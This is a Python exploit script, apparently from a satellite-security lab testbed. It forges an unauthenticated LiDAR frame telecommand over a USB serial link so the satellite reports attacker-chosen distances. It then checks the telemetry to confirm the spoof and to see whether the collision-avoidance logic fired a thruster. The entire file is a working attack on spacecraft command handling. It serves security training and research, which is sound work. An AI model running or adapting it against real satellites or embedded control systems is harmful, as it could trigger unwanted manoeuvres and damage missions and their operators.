#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 08_lidar_payload_spoof_usb.py -- payload-data spoofing of the Tau LiDAR
# payload subsystem over the USB CDC serial link instead of RF. Injects a
# forged SET_LIDAR_FRAME (APID 0x15) so the satellite reports attacker-chosen
# depth ranges. See 08_lidar_payload_spoof_rf.py for the full root-cause
# writeup (commandLidarFrameHandler() trusts the host summary verbatim).
#
# Unlike SET_THRUSTER, SET_LIDAR_FRAME *does* transmit a LIDAR status TM
# (APID 0x14) in reply -- so this script confirms the spoof by reading the
# min/mean/center distances the satellite echoes straight back.

import argparse
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))
sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "Payloads" / "lidar"))

from flatsat_usb import FlatSatUSB  # noqa: E402
from pwnsat_packets import decode_packet  # noqa: E402
from tau_lidar_payload import (  # noqa: E402
    DIST_INVALID,
    SPOOF_PRESETS,
    build_lidar_payload,
    spoof_summary,
)

SPP_APID_TC_SET_LIDAR_FRAME = 0x15
SPP_APID_TM_LIDAR = 0x14
SPP_APID_TM_AUTONOMY = 0x16
AUTONOMY_ACTION_THRUSTER = 0x01


def _mm(value):
    return "----" if value == DIST_INVALID else ("%dmm" % value)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--preset", choices=sorted(SPOOF_PRESETS), default="collision",
                        help="spoof scene to inject (default: collision)")
    parser.add_argument("--min-mm", type=int, default=None, help="override nearest distance")
    parser.add_argument("--mean-mm", type=int, default=None, help="override mean distance")
    parser.add_argument("--max-mm", type=int, default=None, help="override farthest distance")
    parser.add_argument("--center-mm", type=int, default=None, help="override center-pixel distance")
    parser.add_argument("--valid-pct", type=int, default=None, help="override valid-pixel percentage")
    parser.add_argument("--amplitude", type=int, default=None, help="override mean amplitude")
    parser.add_argument("--frame-type", type=int, default=2, help="TauLidar FrameType (0/1/2)")
    parser.add_argument("--frame-count", type=int, default=1, help="forged host frame counter")
    parser.add_argument("--seq", type=int, default=1, help="SPP sequence count")
    parser.add_argument("--encrypt", choices=["on", "off"], default="on")
    parser.add_argument("--port", default=None,
                        help="serial port for the USBRadioLink (default: autodetect)")
    parser.add_argument("--listen", type=float, default=1.0,
                        help="seconds to listen for the LIDAR TM reply (default: 1.0)")
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()

    summary = spoof_summary(
        args.preset, frame_type=args.frame_type, frame_count=args.frame_count,
        min_mm=args.min_mm, mean_mm=args.mean_mm, max_mm=args.max_mm,
        center_mm=args.center_mm, valid_pct=args.valid_pct, amplitude=args.amplitude,
    )
    payload = build_lidar_payload(summary)

    print("[*] LiDAR payload spoof (%s): min=%s mean=%s center=%s max=%s valid=%d%% "
          "-- no authentication required"
          % (args.preset, _mm(summary.min_mm), _mm(summary.mean_mm),
             _mm(summary.center_mm), _mm(summary.max_mm), summary.valid_pct))
    print("[*] Forged SET_LIDAR_FRAME payload (%d B): %s" % (len(payload), payload.hex()))

    with FlatSatUSB(port=args.port, encrypt=(args.encrypt == "on"),
                    verbose=not args.quiet) as fsat:
        _raw, _framed, packets = fsat.send_raw_tc(
            SPP_APID_TC_SET_LIDAR_FRAME, payload, seq=args.seq,
            listen_seconds=args.listen,
        )

        lidar_confirmed = False
        autonomy_fired = False
        for raw in packets:
            try:
                pkt = decode_packet(raw)
                body = fsat.decode_reply_payload(raw)
            except Exception:  # defensive: skip replies that don't parse as SPP
                continue

            # LIDAR TM layout: [0] scid [1] present [2] frameType
            #                  [3..4] min [5..6] max [7..8] mean [9..10] center ...
            if pkt.apid == SPP_APID_TM_LIDAR and len(body) >= 11:
                mn = struct.unpack_from("<H", body, 3)[0]
                me = struct.unpack_from("<H", body, 7)[0]
                ce = struct.unpack_from("<H", body, 9)[0]
                print("[+] CONFIRMED via LIDAR TM (0x14): satellite now reports "
                      "min=%s mean=%s center=%s" % (_mm(mn), _mm(me), _mm(ce)))
                lidar_confirmed = True

            # AUTONOMY TM layout: [1] armed [2] hazard [3..4] min [5..6] center
            #                     [7..8] imuMilliG [9] action [10] thrusterCmd ...
            elif pkt.apid == SPP_APID_TM_AUTONOMY and len(body) >= 11:
                imu = struct.unpack_from("<H", body, 7)[0]
                action = body[9]
                thruster_cmd = body[10]
                if action == AUTONOMY_ACTION_THRUSTER:
                    print("[!] POISONED: collision-avoidance autonomy fired the "
                          "thruster (power=%d) off the spoofed proximity -- the IMU "
                          "(%dmg, no real motion) was never cross-checked."
                          % (thruster_cmd, imu))
                    autonomy_fired = True

    if not lidar_confirmed:
        print("[!] No LIDAR TM (0x14) captured in the listen window -- widen "
              "--listen, or read the spoofed ranges from PWNSAT-C3's LiDAR panel.")
    if not autonomy_fired:
        print("[i] No autonomy maneuver reported -- try --preset collision and "
              "make sure the satellite is in an operational mission mode "
              "(nominal/payload/science), not safe.")


if __name__ == "__main__":
    main()
